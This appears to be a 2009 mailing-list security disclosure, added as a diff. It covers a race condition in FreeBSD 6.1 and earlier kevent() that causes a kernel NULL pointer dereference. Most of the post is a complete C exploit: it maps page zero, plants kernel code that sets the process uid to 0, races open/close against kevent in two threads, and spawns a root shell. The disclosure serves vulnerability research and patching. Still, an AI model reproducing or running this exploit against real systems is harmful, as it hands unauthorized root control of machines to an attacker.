@@ -1,0 +1,138 @@
+
+Date: Sat, 22 Aug 2009 19:06:23 +0200
+From: Przemyslaw Frasunek <venglin@...ebsd.lublin.pl>
+To: full-disclosure@...ts.grok.org.uk, bugtraq@...urityfocus.com
+Subject: FreeBSD <= 6.1 kqueue() NULL pointer dereference
+
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+FreeBSD <= 6.1 suffers from classical check/use race condition on SMP
+systems in kevent() syscall, leading to kernel mode NULL pointer
+dereference. It can be triggered by spawning two threads:
+1st thread looping on open() and close() syscalls, and the 2nd thread
+looping on kevent(), trying to add possibly invalid filedescriptor.
+
+The bug was fixed in 6.1-STABLE, just before release of 6.2-RELEASE, but
+was not recognized as security vulnerability.
+
+The following code exploits this vulnerability to run root shell.
+
+/* 22.08.2009, babcia padlina
+~ * FreeBSD kevent() race condition exploit
+~ *
+~ * works only on multiprocessor systems
+~ * gcc -o padlina padlina.c -lpthread
+~ *
+~ * with thanks to Pawel Pisarczyk for in-depth ia-32 architecture discussion
+~ */
+
+#define _KERNEL
+
+#include <sys/types.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/event.h>
+#include <sys/timespec.h>
+#include <pthread.h>
+#include <fcntl.h>
+#include <string.h>
+#include <stdlib.h>
+#include <sys/mman.h>
+
+#include <sys/param.h>
+#include <sys/linker.h>
+#include <sys/linker.h>
+#include <sys/proc.h>
+
+int fd;
+int kq;
+struct kevent kev, ke[10];
+struct timespec timeout;
+int gotroot = 0;
+
+static void kernel_code(void) {
+~        struct thread *thread;
+~        gotroot = 1;
+~        asm(
+~                "pushl %%eax;"
+~                "movl %%fs:0, %0"
+~                : "=r"(thread)
+~        );
+~        thread->td_proc->p_ucred->cr_uid = 0;
+~        asm("popl %eax");
+~        return;
+}
+
+void do_thread(void) {
+~        sleep(1);
+
+~        while (!gotroot) {
+~                memset(&kev, 0, sizeof(kev));
+~                EV_SET(&kev, fd, EVFILT_VNODE, EV_ADD, 0, 0, NULL);
+
+~                if (kevent(kq, &kev, 1, &ke, sizeof(ke), &timeout) < 0) {
+~                        perror("kevent");
+~                }
+~        }
+
+}
+
+void do_thread2(void) {
+~        while(!gotroot) {
+~                if ((fd = open("/tmp/.padlina", O_RDWR | O_CREAT, 0600)) < 0)
+~                        perror("open");
+
+~                close(fd);
+~        }
+}
+
+int main(void) {
+~        pthread_t pth, pth2;
+~        long *ap;
+~        unsigned char *p, *sp;
+
+~        if (mmap(0, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON |
+MAP_FIXED, -1, 0) < 0) {
+~                perror("mmap");
+~                return -1;
+~        }
+
+~        memset(0x0, 0xc3, 0x1000);
+
+~        for (p = 0, sp = &kernel_code; *sp != 0xc3;)
+~                        *p++ = *sp++;
+
+~        if ((kq = kqueue()) < 0) {
+~                perror("kqueue");
+~                return -1;
+~        }
+
+~        pthread_create(&pth, NULL, do_thread, NULL);
+~        pthread_create(&pth2, NULL, do_thread2, NULL);
+
+~        timeout.tv_sec = 0;
+~        timeout.tv_nsec = 1;
+
+~        while (!gotroot)
+~                usleep(100);
+
+~        setuid(0);
+~        execl("/bin/sh", "sh", 0);
+
+~        printf("exploit failed\n");
+~        return 0;
+}
+
+
+- --
+* Fido: 2:480/124 ** WWW: http://www.frasunek.com/ ** NICHDL: PMF9-RIPE *
+* JID: venglin@...ber.atman.pl ** PGP ID: 2578FCAD ** HAM-RADIO: SQ8JIV *
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.9 (MingW32)
+Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
+
+iEYEARECAAYFAkqQJY8ACgkQkxEnBiV4/K1IRACeI/GYTKhzGqPJLkpheDV8rEIl
+yFMAnAo6czNexms9f4zMwUjzAioNRtqz
+=8qMi
+-----END PGP SIGNATURE-----
